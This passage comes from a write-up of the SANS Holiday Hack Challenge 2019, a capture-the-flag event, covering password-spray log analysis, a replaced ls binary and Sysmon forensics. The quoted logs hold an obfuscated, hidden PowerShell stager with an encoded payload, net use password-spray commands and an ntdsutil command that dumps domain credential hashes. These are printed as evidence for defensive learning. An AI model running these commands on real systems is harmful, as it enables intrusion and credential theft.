77 &lt;Data Name=&quot;TargetUserName&quot;&gt;ltrufflefig&lt;/Data&gt;
77 &lt;Data Name=&quot;TargetUserName&quot;&gt;lstripyleaves&lt;/Data&gt;
77 &lt;Data Name=&quot;TargetUserName&quot;&gt;hevergreen&lt;/Data&gt;
77 &lt;Data Name=&quot;TargetUserName&quot;&gt;hcandysnaps&lt;/Data&gt;
77 &lt;Data Name=&quot;TargetUserName&quot;&gt;gchocolatewine&lt;/Data&gt;
77 &lt;Data Name=&quot;TargetUserName&quot;&gt;gcandyfluff&lt;/Data&gt;
77 &lt;Data Name=&quot;TargetUserName&quot;&gt;ftwinklestockings&lt;/Data&gt;
77 &lt;Data Name=&quot;TargetUserName&quot;&gt;ftinseltoes&lt;/Data&gt;
77 &lt;Data Name=&quot;TargetUserName&quot;&gt;esparklesleigh&lt;/Data&gt;
77 &lt;Data Name=&quot;TargetUserName&quot;&gt;dsparkleleaves&lt;/Data&gt;
77 &lt;Data Name=&quot;TargetUserName&quot;&gt;cstripyfluff&lt;/Data&gt;
77 &lt;Data Name=&quot;TargetUserName&quot;&gt;cjinglebuns&lt;/Data&gt;
77 &lt;Data Name=&quot;TargetUserName&quot;&gt;civysparkles&lt;/Data&gt;
77 &lt;Data Name=&quot;TargetUserName&quot;&gt;civypears&lt;/Data&gt;
77 &lt;Data Name=&quot;TargetUserName&quot;&gt;bevergreen&lt;/Data&gt;
77 &lt;Data Name=&quot;TargetUserName&quot;&gt;bbrandyleaves&lt;/Data&gt;
77 &lt;Data Name=&quot;TargetUserName&quot;&gt;Administrator&lt;/Data&gt;
76 &lt;Data Name=&quot;TargetUserName&quot;&gt;supatree&lt;/Data&gt;
</pre>
<p>We can see that <code>supatree</code> has one less failed authentication attempt.
This must means that it's the account that was compromised by the password
spray attack.</p>
</div>
</div>
<div class="section" id="objective-4">
<h2><a class="toc-backref" href="#id8">Objective 4:</a></h2>
<div class="section" id="sugarplum-mary-s-cranberry-pi-challenge">
<h3><a class="toc-backref" href="#id9">SugarPlum Mary's Cranberry Pi Challenge</a></h3>
<p>We're supposed to list the content of the current directory:</p>
<div class="highlight"><pre><span></span><span class="go">K000K000K000KK0KKKKKXKKKXKKKXKXXXXXNXXXX0kOKKKK0KXKKKKKKK0KKK0KK0KK0KK0KK0KK0KKKKKK</span>
<span class="go">00K000KK0KKKKKKKKKXKKKXKKXXXXXXXXNXXNNXXooNOXKKXKKXKKKXKKKKKKKKKK0KKKKK0KK0KK0KKKKK</span>
<span class="go">KKKKKKKKKKKXKKXXKXXXXXXXXXXXXXNXNNNNNNK0x:xoxOXXXKKXXKXXKKXKKKKKKKKKKKKKKKKKKKKKKKK</span>
<span class="go">K000KK00KKKKKKKKXXKKXXXXNXXXNXXNNXNNNNNWk.ddkkXXXXXKKXKKXKKXKKXKKXKKXK0KK0KK0KKKKKK</span>
<span class="go">00KKKKKKKKKXKKXXKXXXXXNXXXNXXNNNNNNNNWXXk,ldkOKKKXXXXKXKKXKKXKKXKKKKKKKKKK0KK0KK0XK</span>
<span class="go">KKKXKKKXXKXXXXXNXXXNXXNNXNNNNNNNNNXkddk0No,;;:oKNK0OkOKXXKXKKXKKKKKKKKKKKKK0KK0KKKX</span>
<span class="go">0KK0KKKKKXKKKXXKXNXXXNXXNNXNNNNXxl;o0NNNo,,,;;;;KWWWN0dlk0XXKKXKKXKKXKKKKKKKKKKKKKK</span>
<span class="go">KKKKKKKKXKXXXKXXXXXNXXNNXNNNN0o;;lKNNXXl,,,,,,,,cNNNNNNKc;oOXKKXKKXKKXKKXKKKKKKKKKK</span>
<span class="go">XKKKXKXXXXXXNXXNNXNNNNNNNNN0l;,cONNXNXc&#39;,,,,,,,,,KXXXXXNNl,;oKXKKXKKKKKK0KKKKK0KKKX</span>
<span class="go">KKKKKKXKKXXKKXNXXNNXNNNNNXl;,:OKXXXNXc&#39;&#39;&#39;,,&#39;&#39;&#39;&#39;&#39;,KKKKKKXXK,,;:OXKKXKKXKKX0KK0KK0KKK</span>
<span class="go">KKKKKKKKXKXXXXXNNXXNNNNW0:;,dXXXXXNK:&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;cKKKKKKKXX;,,,;0XKKXKKXKKXKKK0KK0KK</span>
<span class="go">XXKXXXXXXXXXXNNNNNNNNNN0;;;ONXXXXNO,&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;x0KKKKKKXK,&#39;,,,cXXKKKKKKKKXKKK0KKKX</span>
<span class="go">KKKKKKKXKKXXXXNNNNWNNNN:;:KNNXXXXO,&#39;.&#39;..&#39;.&#39;&#39;..&#39;:O00KKKKKXd&#39;&#39;,,,,KKXKKXKKKKKKKKKKKKK</span>
<span class="go">KKKKKXKKXXXXXXXXNNXNNNx;cXNXXXXKk,&#39;&#39;&#39;.&#39;&#39;.&#39;&#39;&#39;&#39;.,xO00KKKKKO,&#39;&#39;,,,,KK0XKKXKKK0KKKKKKKK</span>
<span class="go">XXXXXXXXXKXXXXXXXNNNNNo;0NXXXKKO,&#39;&#39;&#39;&#39;&#39;&#39;&#39;.&#39;.&#39;.;dkOO0KKKK0;.&#39;&#39;,,,,XXXKKK0KK0KKKKKKKKX</span>
<span class="go">XKKXXKXXXXXXXXXXXNNNNNcoNNXXKKO,&#39;&#39;&#39;&#39;.&#39;......:dxkOOO000k,..&#39;&#39;&#39;,,lNXKXKKXKKK0KKKXKKKK</span>
<span class="go">KXXKKXXXKXXKXXXXXXXNNNoONNXXX0;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;..&#39;lkkkkkkxxxd&#39;...&#39;&#39;&#39;&#39;,0N0KKKKKXKKKKKK0XKKK</span>
<span class="go">XXXXXKKXXKXXXXXXXXXXXXOONNNXXl,,;;,;;;;;;;d0K00Okddoc,,,,,,,,,xNNOXKKKKKXKKKKKKKXKK</span>
<span class="go">XXXXXXXXXXXXXXXXXXXXXXXONNNXx;;;;;;;;;,,:xO0KK0Oxdoc,,,,,,,,,oNN0KXXKKXKKXKKKKKKKXK</span>
<span class="go">XKXXKXXXXXXXXXXXXXXXXXXXXWNX:;;;;;;;;;,cO0KKKK0Okxl,,,,,,,,,oNNK0NXXXXXXXXXKKKKKKKX</span>
<span class="go">XXXXXXXXXXXXXXXXXXXXXXXNNNWNc;;:;;;;;;xKXXXXXXKK0x,,,,,,,,,dXNK0NXXXXXXXXXXXKKXKKKK</span>
<span class="go">XKXXXXXXXXXXXXXXXXXXXXNNWWNWd;:::;;;:0NNNNNNNNNXO;,,,,,,,:0NN0XNXNXXXXXXXXXXXKKXKKX</span>
<span class="go">NXXXXXXXXXXXXXXXXXXXXXNNNNNNNl:::;;:KNNNNNNNNNNO;,,,,,,;xNNK0NXNXXNXXXXXXKXXKKKKXKK</span>
<span class="go">XXNNXNNNXXXXXXXXXXXXXNNNNNNNNNkl:;;xWWNNNNNWWWk;;;;;;;xNNKKXNXNXXNXXXXXXXXXXXKXKKXK</span>
<span class="go">XXXXXNNNNXNNNNXXXXXXNNNNNNNNNNNNKkolKNNNNNNNNx;;;;;lkNNXNNNNXXXNXXNXXXXXXXXXXXKKKKX</span>
<span class="go">XXXXXXXXXXXNNNNNNNNNNNNNNNNNNNNNNNNNKXNNNNWNo:clxOXNNNNNNNNXNXXXXXXXXXXXXXXXKKXKKKK</span>
<span class="go">XXXXNXXXNXXXNXXNNNNNWWWWWNNNNNNNNNNNNNNNNNWWNWWNWNNWNNNNNNNNXXXXXXNXXXXXXXXXXKKXKKX</span>
<span class="go">XNXXXXNNXXNXXNNXNXNWWWWWWWWWNNNNNNNNNNNNNWWWWNNNNNNNNNNNNNNNNNNNNNXNXXXXNXXXXXXKXKK</span>
<span class="go">XXXXNXXNNXXXNXXNXXNWWWNNNNNNNNNWWNNNNNNNNWWWWWWNWNNNNNNNNNNNNNNNXXNXNXXXXNXXXXKXKXK</span>
<span class="go">I need to list files in my home/</span>
<span class="go">To check on project logos</span>
<span class="go">But what I see with ls there,</span>
<span class="go">Are quotes from desert hobos...</span>
<span class="go">which piece of my command does fail?</span>
<span class="go">I surely cannot find it.</span>
<span class="go">Make straight my path and locate that-</span>
<span class="go">I&#39;ll praise your skill and sharp wit!</span>
<span class="go">Get a listing (ls) of your current directory.</span>
<span class="gp">elf@ffba3960c30f:~$</span>
</pre></div>
<p>Alright, let's just <code>ls</code> the directory:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@ffba3960c30f:~$</span> ls
<span class="go">This isn&#39;t the ls you&#39;re looking for</span>
</pre></div>
<p>Hmm, weird. It looks like the <code>ls</code> binary was replaced. Let's see which
program is used using the <code>which</code> command:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@ffba3960c30f:~$</span> which ls
<span class="go">/usr/local/bin/ls</span>
</pre></div>
<p>Indeed, it does not seem to be the usual <code>ls</code> binary. Let's search for
every file named <code>ls</code> at the root of the file system:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@ffba3960c30f:~$</span> find / -name ls -type f <span class="m">2</span>&gt;/dev/null
<span class="go">/usr/local/bin/ls</span>
<span class="hll"><span class="go">/bin/ls</span>
</span></pre></div>
<p>The usual <code>ls</code> binary seems to be at <code>/bin/ls</code>. So let's call this
binary directly:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@ffba3960c30f:~$</span> /bin/ls
<span class="go">&#39; &#39;   rejected-elfu-logos.txt</span>
<span class="go">Loading, please wait......</span>



<span class="go">You did it! Congratulations!</span>
</pre></div>
</div>
<div class="section" id="windows-log-analysis-determine-attacker-technique">
<h3><a class="toc-backref" href="#id10">Windows Log Analysis: Determine Attacker Technique</a></h3>
<p>We're given <a class="reference external" href="/docs/sans-christmas-challenge-2019/sysmon-data.json.zip">Sysmong logs</a>
to try and understand which technique the attacker used. We're asked to
identify what tool the attacker used to retrieve domain password hashes from
the <code>lsass.exe</code> process.</p>
<p>In these logs, we have a lot of interesting events. We can see the execution of
suspicious PowerShell commands:</p>
<div class="highlight"><pre><span></span><span class="p">{</span>
    <span class="nt">&quot;command_line&quot;</span><span class="p">:</span> <span class="s2">&quot;C:\\Windows\\system32\\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c \&quot;if([IntPtr]::Size -eq 4){$b=&#39;powershell.exe&#39;}else{$b=$env:windir+&#39;\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe&#39;};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments=&#39;-noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(&#39;&#39;H4sIACHe010CA7VWbW/aSBD+nEj5D1aFZFshGANt2kiVbs07wQnEQCAUnTb22iysvWCvCabtf78x4DS9plV70ll5We/OzM4888yM3TiwBeWBhEsD6fPZ6UkPh9iXlBy13w3yUi5h60A9OYGDnN2VPkrKFK1WNe5jGsyurqpxGJJAHN4LTSJQFBH/kVESKar0Rbqfk5Bc3D4uiC2kz1Lu70KT8UfMjmJJFdtzIl2gwEnPutzGqS8Fa8WoUORPn2R1eqHPCvV1jFmkyFYSCeIXHMZkVfqqphcOkhVRZJPaIY+4Kwr3NCiXCsMgwi65AWsbYhIx504kqxAD/IRExGEgQTSp+uFQkWHZC7mNHCckUSTnpWlqeDqb/aVMj7fexYGgPim0A0FCvrJIuKE2iQotHDiM3BF3BlqWCGngzVQVxDZ8SZRcEDOWl/7EjHJDnjLMfldJeakEUj0RqnnI4g9RmtyJGTnoya+4uc+7Ck+We4Dt69np2ambEYWuX/IEVifT/ZqAa0qPR3Qv9VEq5iUTrsGChwm85gZhTNTZM7BSbuHkf66tZ6IguClh2JmOOHVmoHFMZM63rGa6/3NC1ohLA1JLAuxTO+Oc8hq+xGVkH14hE7sBnxT5eECcGmHEwyLFLE3zD2p1n4pnXSOmzCEhsiFHEXgF6VO/d+aQBkVuBybxAaDDO/Au5wLTSSZ9ZHeS3Z6+g5BcZTiK8lIvhlKz85JFMCNOXkJBRI9HKBZ8v5S/uWvGTFAbRyIzN1MzHI/3VXkQiTC2IWcQ+8BaEZtilkKRl1rUIUZiUS+7V34ViCpmDEoALG0gEbCTAmCJlAkhuAhZVwsWEW1/xYgPEvuKbzDsQX0fab4nDvaII//bv4zIB9amSGQQvPAO0msxLvLSiIYCGkeKKlDov9z9ol/svaiG5JgFJauLqZGIlM+5qDRItikfj5jsEQgFRN8IuW/giLyrHNqD8ka7pVUEz6QdMNM2llRHT1Rvm/A7pOU2r106151FSwtr27mL2lHbbPVq/VarsulYo4qw6m1x3WsLsz5eLCzUuhtOxEMbtQa0uJxUdqsO3Vld5Ey22rudsXsqGtvdwnPcSc11vUvXutPfNmj3vto3iiXcrdXj7r3xZBQrUZ0+tfp02F92GuJxMmJ46GreWP+A6bYbLkY6N3dthJrzsr3ruKPm3HSSSYuShVbs0j7qI3Rt3w2HTW/lNSOkfRitq/4CrRsYYdRG9VHSecuM/rBhoGHd6ONb3iuf1zT9wVnXGw9j3PGZ02xp+mSMHBRqA2+uX97OgxQn7BlrI5VB3YekoYFMr4JalRLdPaz7TQ/VQWbkc4QbdDk8H4PNmwHo3A91hyMRtMeaNvI0D7nWfIKRAdLGGjUMXk3e98yeNhqV5vrjUp+Dz2S8eW920HnD7mmadu4/wl8N2eZqG4yNp8uN17L4Nb7Go81DWdMHT00XrdH5uaEbj6JVL3c2cO9A+zD8+CYlEDAoZ/PhC1r8rJWbOIzmmAFdoEtnBdrgYePYd3ucphqKkg7qJQkDwmDQwSjMaI4Y43ba9KFBw7g5DIF0Jg1hWS69ulKlZ0H12zDItq6uHsBFqJs9tQtdEnhini9uy8UiNPfitlKEEH8/ripfJcrBVj6dDikwz8bZ3riaVlTONd/q1v8K2bGO5/DP+TVk3/Z+cfpbMBbz+4B/2P1+448Q/dOw7zEVIGhBD2LkMAFfi/7IjRdfB/uMQObd45N+293G4uIGvhrOTv8BxRZ9dEQKAAA=&#39;&#39;))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))&#39;;$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle=&#39;Hidden&#39;;$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\&quot;&quot;</span><span class="p">,</span>
    <span class="nt">&quot;event_type&quot;</span><span class="p">:</span> <span class="s2">&quot;process&quot;</span><span class="p">,</span>
    <span class="nt">&quot;logon_id&quot;</span><span class="p">:</span> <span class="mi">999</span><span class="p">,</span>
    <span class="nt">&quot;parent_process_name&quot;</span><span class="p">:</span> <span class="s2">&quot;?&quot;</span><span class="p">,</span>
    <span class="nt">&quot;parent_process_path&quot;</span><span class="p">:</span> <span class="s2">&quot;?&quot;</span><span class="p">,</span>
    <span class="nt">&quot;pid&quot;</span><span class="p">:</span> <span class="mi">3468</span><span class="p">,</span>
    <span class="nt">&quot;ppid&quot;</span><span class="p">:</span> <span class="mi">616</span><span class="p">,</span>
    <span class="nt">&quot;process_name&quot;</span><span class="p">:</span> <span class="s2">&quot;cmd.exe&quot;</span><span class="p">,</span>
    <span class="nt">&quot;process_path&quot;</span><span class="p">:</span> <span class="s2">&quot;C:\\Windows\\System32\\cmd.exe&quot;</span><span class="p">,</span>
    <span class="nt">&quot;subtype&quot;</span><span class="p">:</span> <span class="s2">&quot;create&quot;</span><span class="p">,</span>
    <span class="nt">&quot;timestamp&quot;</span><span class="p">:</span> <span class="mi">132110784202880000</span><span class="p">,</span>
    <span class="nt">&quot;unique_pid&quot;</span><span class="p">:</span> <span class="s2">&quot;{7431d376-7e14-5d60-0000-0010bffd2500}&quot;</span><span class="p">,</span>
    <span class="nt">&quot;unique_ppid&quot;</span><span class="p">:</span> <span class="s2">&quot;{00000000-0000-0000-0000-000000000000}&quot;</span><span class="p">,</span>
    <span class="nt">&quot;user&quot;</span><span class="p">:</span> <span class="s2">&quot;NT AUTHORITY\\SYSTEM&quot;</span><span class="p">,</span>
    <span class="nt">&quot;user_domain&quot;</span><span class="p">:</span> <span class="s2">&quot;NT AUTHORITY&quot;</span><span class="p">,</span>
    <span class="nt">&quot;user_name&quot;</span><span class="p">:</span> <span class="s2">&quot;SYSTEM&quot;</span>
<span class="p">}</span>
</pre></div>
<p>Or the password spray attacks:</p>
<div class="highlight"><pre><span></span><span class="p">{</span>
<span class="hll">    <span class="nt">&quot;command_line&quot;</span><span class="p">:</span> <span class="s2">&quot;net  use \\\\127.0.0.1\\IPC$ /user:ELFU\\bbrandyleaves ???Summer2019  &quot;</span><span class="p">,</span>
</span>    <span class="nt">&quot;event_type&quot;</span><span class="p">:</span> <span class="s2">&quot;process&quot;</span><span class="p">,</span>
    <span class="nt">&quot;logon_id&quot;</span><span class="p">:</span> <span class="mi">999</span><span class="p">,</span>
    <span class="nt">&quot;parent_process_name&quot;</span><span class="p">:</span> <span class="s2">&quot;cmd.exe&quot;</span><span class="p">,</span>
    <span class="nt">&quot;parent_process_path&quot;</span><span class="p">:</span> <span class="s2">&quot;C:\\Windows\\SysWOW64\\cmd.exe&quot;</span><span class="p">,</span>
    <span class="nt">&quot;pid&quot;</span><span class="p">:</span> <span class="mi">752</span><span class="p">,</span>
    <span class="nt">&quot;ppid&quot;</span><span class="p">:</span> <span class="mi">1072</span><span class="p">,</span>
    <span class="nt">&quot;process_name&quot;</span><span class="p">:</span> <span class="s2">&quot;net.exe&quot;</span><span class="p">,</span>
    <span class="nt">&quot;process_path&quot;</span><span class="p">:</span> <span class="s2">&quot;C:\\Windows\\SysWOW64\\net.exe&quot;</span><span class="p">,</span>
    <span class="nt">&quot;subtype&quot;</span><span class="p">:</span> <span class="s2">&quot;create&quot;</span><span class="p">,</span>
    <span class="nt">&quot;timestamp&quot;</span><span class="p">:</span> <span class="mi">132186397042689984</span><span class="p">,</span>
    <span class="nt">&quot;unique_pid&quot;</span><span class="p">:</span> <span class="s2">&quot;{7431d376-de58-5dd3-0000-0010d9b82600}&quot;</span><span class="p">,</span>
    <span class="nt">&quot;unique_ppid&quot;</span><span class="p">:</span> <span class="s2">&quot;{7431d376-de52-5dd3-0000-0010dea72600}&quot;</span><span class="p">,</span>
    <span class="nt">&quot;user&quot;</span><span class="p">:</span> <span class="s2">&quot;NT AUTHORITY\\SYSTEM&quot;</span><span class="p">,</span>
    <span class="nt">&quot;user_domain&quot;</span><span class="p">:</span> <span class="s2">&quot;NT AUTHORITY&quot;</span><span class="p">,</span>
    <span class="nt">&quot;user_name&quot;</span><span class="p">:</span> <span class="s2">&quot;SYSTEM&quot;</span>
<span class="p">}</span><span class="err">,</span>
<span class="p">{</span>
<span class="hll">    <span class="nt">&quot;command_line&quot;</span><span class="p">:</span> <span class="s2">&quot;net  use \\\\127.0.0.1\\IPC$ /user:ELFU\\bevergreen ???Summer2019  &quot;</span><span class="p">,</span>
</span>    <span class="nt">&quot;event_type&quot;</span><span class="p">:</span> <span class="s2">&quot;process&quot;</span><span class="p">,</span>
    <span class="nt">&quot;logon_id&quot;</span><span class="p">:</span> <span class="mi">999</span><span class="p">,</span>
    <span class="nt">&quot;parent_process_name&quot;</span><span class="p">:</span> <span class="s2">&quot;cmd.exe&quot;</span><span class="p">,</span>
    <span class="nt">&quot;parent_process_path&quot;</span><span class="p">:</span> <span class="s2">&quot;C:\\Windows\\SysWOW64\\cmd.exe&quot;</span><span class="p">,</span>
    <span class="nt">&quot;pid&quot;</span><span class="p">:</span> <span class="mi">724</span><span class="p">,</span>
    <span class="nt">&quot;ppid&quot;</span><span class="p">:</span> <span class="mi">1072</span><span class="p">,</span>
    <span class="nt">&quot;process_name&quot;</span><span class="p">:</span> <span class="s2">&quot;net.exe&quot;</span><span class="p">,</span>
    <span class="nt">&quot;process_path&quot;</span><span class="p">:</span> <span class="s2">&quot;C:\\Windows\\SysWOW64\\net.exe&quot;</span><span class="p">,</span>
    <span class="nt">&quot;subtype&quot;</span><span class="p">:</span> <span class="s2">&quot;create&quot;</span><span class="p">,</span>
    <span class="nt">&quot;timestamp&quot;</span><span class="p">:</span> <span class="mi">132186397042960000</span><span class="p">,</span>
    <span class="nt">&quot;unique_pid&quot;</span><span class="p">:</span> <span class="s2">&quot;{7431d376-de58-5dd3-0000-00104dbd2600}&quot;</span><span class="p">,</span>
    <span class="nt">&quot;unique_ppid&quot;</span><span class="p">:</span> <span class="s2">&quot;{7431d376-de52-5dd3-0000-0010dea72600}&quot;</span><span class="p">,</span>
    <span class="nt">&quot;user&quot;</span><span class="p">:</span> <span class="s2">&quot;NT AUTHORITY\\SYSTEM&quot;</span><span class="p">,</span>
    <span class="nt">&quot;user_domain&quot;</span><span class="p">:</span> <span class="s2">&quot;NT AUTHORITY&quot;</span><span class="p">,</span>
    <span class="nt">&quot;user_name&quot;</span><span class="p">:</span> <span class="s2">&quot;SYSTEM&quot;</span>
<span class="p">}</span><span class="err">,</span>
<span class="p">{</span>
<span class="hll">    <span class="nt">&quot;command_line&quot;</span><span class="p">:</span> <span class="s2">&quot;net  use \\\\127.0.0.1\\IPC$ /user:ELFU\\civypears ???Summer2019  &quot;</span><span class="p">,</span>
</span>    <span class="nt">&quot;event_type&quot;</span><span class="p">:</span> <span class="s2">&quot;process&quot;</span><span class="p">,</span>
    <span class="nt">&quot;logon_id&quot;</span><span class="p">:</span> <span class="mi">999</span><span class="p">,</span>
    <span class="nt">&quot;parent_process_name&quot;</span><span class="p">:</span> <span class="s2">&quot;cmd.exe&quot;</span><span class="p">,</span>
    <span class="nt">&quot;parent_process_path&quot;</span><span class="p">:</span> <span class="s2">&quot;C:\\Windows\\SysWOW64\\cmd.exe&quot;</span><span class="p">,</span>
    <span class="nt">&quot;pid&quot;</span><span class="p">:</span> <span class="mi">2848</span><span class="p">,</span>
    <span class="nt">&quot;ppid&quot;</span><span class="p">:</span> <span class="mi">1072</span><span class="p">,</span>
    <span class="nt">&quot;process_name&quot;</span><span class="p">:</span> <span class="s2">&quot;net.exe&quot;</span><span class="p">,</span>
    <span class="nt">&quot;process_path&quot;</span><span class="p">:</span> <span class="s2">&quot;C:\\Windows\\SysWOW64\\net.exe&quot;</span><span class="p">,</span>
    <span class="nt">&quot;subtype&quot;</span><span class="p">:</span> <span class="s2">&quot;create&quot;</span><span class="p">,</span>
    <span class="nt">&quot;timestamp&quot;</span><span class="p">:</span> <span class="mi">132186397043230000</span><span class="p">,</span>
    <span class="nt">&quot;unique_pid&quot;</span><span class="p">:</span> <span class="s2">&quot;{7431d376-de58-5dd3-0000-0010c1c12600}&quot;</span><span class="p">,</span>
    <span class="nt">&quot;unique_ppid&quot;</span><span class="p">:</span> <span class="s2">&quot;{7431d376-de52-5dd3-0000-0010dea72600}&quot;</span><span class="p">,</span>
    <span class="nt">&quot;user&quot;</span><span class="p">:</span> <span class="s2">&quot;NT AUTHORITY\\SYSTEM&quot;</span><span class="p">,</span>
    <span class="nt">&quot;user_domain&quot;</span><span class="p">:</span> <span class="s2">&quot;NT AUTHORITY&quot;</span><span class="p">,</span>
    <span class="nt">&quot;user_name&quot;</span><span class="p">:</span> <span class="s2">&quot;SYSTEM&quot;</span>
<span class="p">}</span><span class="err">,</span>
</pre></div>
<p>But the last event is the most interesting one:</p>
<div class="highlight"><pre><span></span><span class="p">{</span>
<span class="hll">    <span class="nt">&quot;command_line&quot;</span><span class="p">:</span> <span class="s2">&quot;ntdsutil.exe  \&quot;ac i ntds\&quot; ifm \&quot;create full c:\\hive\&quot; q q&quot;</span><span class="p">,</span>
</span>    <span class="nt">&quot;event_type&quot;</span><span class="p">:</span> <span class="s2">&quot;process&quot;</span><span class="p">,</span>
    <span class="nt">&quot;logon_id&quot;</span><span class="p">:</span> <span class="mi">999</span><span class="p">,</span>
    <span class="nt">&quot;parent_process_name&quot;</span><span class="p">:</span> <span class="s2">&quot;cmd.exe&quot;</span><span class="p">,</span>
    <span class="nt">&quot;parent_process_path&quot;</span><span class="p">:</span> <span class="s2">&quot;C:\\Windows\\System32\\cmd.exe&quot;</span><span class="p">,</span>
    <span class="nt">&quot;pid&quot;</span><span class="p">:</span> <span class="mi">3556</span><span class="p">,</span>
    <span class="nt">&quot;ppid&quot;</span><span class="p">:</span> <span class="mi">3440</span><span class="p">,</span>
    <span class="nt">&quot;process_name&quot;</span><span class="p">:</span> <span class="s2">&quot;ntdsutil.exe&quot;</span><span class="p">,</span>
    <span class="nt">&quot;process_path&quot;</span><span class="p">:</span> <span class="s2">&quot;C:\\Windows\\System32\\ntdsutil.exe&quot;</span><span class="p">,</span>
    <span class="nt">&quot;subtype&quot;</span><span class="p">:</span> <span class="s2">&quot;create&quot;</span><span class="p">,</span>
    <span class="nt">&quot;timestamp&quot;</span><span class="p">:</span> <span class="mi">132186398470300000</span><span class="p">,</span>
    <span class="nt">&quot;unique_pid&quot;</span><span class="p">:</span> <span class="s2">&quot;{7431d376-dee7-5dd3-0000-0010f0c44f00}&quot;</span><span class="p">,</span>
    <span class="nt">&quot;unique_ppid&quot;</span><span class="p">:</span> <span class="s2">&quot;{7431d376-dedb-5dd3-0000-001027be4f00}&quot;</span><span class="p">,</span>
    <span class="nt">&quot;user&quot;</span><span class="p">:</span> <span class="s2">&quot;NT AUTHORITY\\SYSTEM&quot;</span><span class="p">,</span>
    <span class="nt">&quot;user_domain&quot;</span><span class="p">:</span> <span class="s2">&quot;NT AUTHORITY&quot;</span><span class="p">,</span>
    <span class="nt">&quot;user_name&quot;</span><span class="p">:</span> <span class="s2">&quot;SYSTEM&quot;</span>
<span class="p">}</span>
</pre></div>
<p>The <code>ntdsutil.exe</code> can be used to create a full back-up of the
<code>ntds.dit</code> hive on a domain controller. This file can then be parsed with
something like <a class="reference external" href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py">secretsdump.py</a>.</p>
<p>I first thought that this was not the correct answer, because, as I understand
it, <code>ntdsutil.exe</code> does not interact with the <code>lsass.exe</code> to
extract password hashes: an external tool must be used to extract these hashes.
Then, after analyzing the rest of the log file, I didn't see any other tool
that could be used to extract hashes. So I tried to answer
<code>ntdsutil.exe</code>, but was given an error message by the KringleCon form.</p>
<p>It turns out that the correct solution is <code>ntdsutil</code>.</p>
</div>
</div>
<div class="section" id="objective-5">
<h2><a class="toc-backref" href="#id11">Objective 5:</a></h2>
<div class="section" id="sparkle-redberry-s-canberry-pi-challenge">
<h3><a class="toc-backref" href="#id12">Sparkle Redberry's Canberry Pi Challenge</a></h3>
<p>Apparently, the research lab at Elf U is building a laser that can shoot beams
of Christmas cheer. However, someone apparently messed with the parameters, and
now the laser is not producing enough Mega-Jollies per liter.</p>
<div class="highlight"><pre><span></span><span class="go">WARNGING: ctrl + c restricted in this terminal - Do not use endless loops</span>
<span class="go">Type exit to exit PowerShell.</span>
<span class="go">PowerShell 6.2.3</span>
<span class="go">Copyright (c) Microsoft Corporation. All rights reserved.</span>
<span class="go">https://aka.ms/pscore6-docs</span>
<span class="go">Type &#39;help&#39; to get help.</span>
<span class="go">🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲</span>
<span class="go">🗲                                                                                🗲</span>
<span class="go">🗲 Elf University Student Research Terminal - Christmas Cheer Laser Project       🗲</span>
<span class="go">🗲 ------------------------------------------------------------------------------ 🗲</span>
<span class="go">🗲 The research department at Elf University is currently working on a top-secret 🗲</span>
<span class="go">🗲 Laser which shoots laser beams of Christmas cheer at a range of hundreds of    🗲</span>
<span class="go">🗲 miles. The student research team was successfully able to tweak the laser to   🗲</span>
<span class="go">🗲 JUST the right settings to achieve 5 Mega-Jollies per liter of laser output.   🗲</span>
<span class="go">🗲 Unfortunately, someone broke into the research terminal, changed the laser     🗲</span>
<span class="go">🗲 settings through the Web API and left a note behind at /home/callingcard.txt.  🗲</span>
<span class="go">🗲 Read the calling card and follow the clues to find the correct laser Settings. 🗲</span>
<span class="go">🗲 Apply these correct settings to the laser using it&#39;s Web API to achieve laser  🗲</span>
<span class="go">🗲 output of 5 Mega-Jollies per liter.                                            🗲</span>
<span class="go">🗲                                                                                🗲</span>
<span class="go">🗲 Use (Invoke-WebRequest -Uri http://localhost:1225/).RawContent for more info.  🗲</span>
<span class="go">🗲                                                                                🗲</span>
<span class="go">🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲</span>
<span class="go">PS /home/elf&gt;</span>
</pre></div>
<p>Let's try to find the correct value for the different parameters. Let's start
with the <code>Invoke-WebRequest</code> command:</p>
<div class="highlight"><pre><span></span><span class="go">PS /home/elf&gt; (Invoke-WebRequest -Uri http://localhost:1225/).RawContent</span>
<span class="go">HTTP/1.0 200 OK</span>
<span class="go">Server: Werkzeug/0.16.0</span>
<span class="go">Server: Python/3.6.9</span>
<span class="go">Date: Mon, 23 Dec 2019 20:01:04 GMT</span>
<span class="go">Content-Type: text/html; charset=utf-8</span>
<span class="go">Content-Length: 860</span>

<span class="go">&lt;html&gt;</span>
<span class="go">&lt;body&gt;</span>
<span class="go">&lt;pre&gt;</span>
<span class="go">----------------------------------------------------</span>
<span class="go">Christmas Cheer Laser Project Web API</span>
<span class="go">----------------------------------------------------</span>
<span class="go">Turn the laser on/off:</span>
<span class="go">GET http://localhost:1225/api/on</span>
<span class="go">GET http://localhost:1225/api/off</span>

<span class="go">Check the current Mega-Jollies of laser output</span>
<span class="go">GET http://localhost:1225/api/output</span>

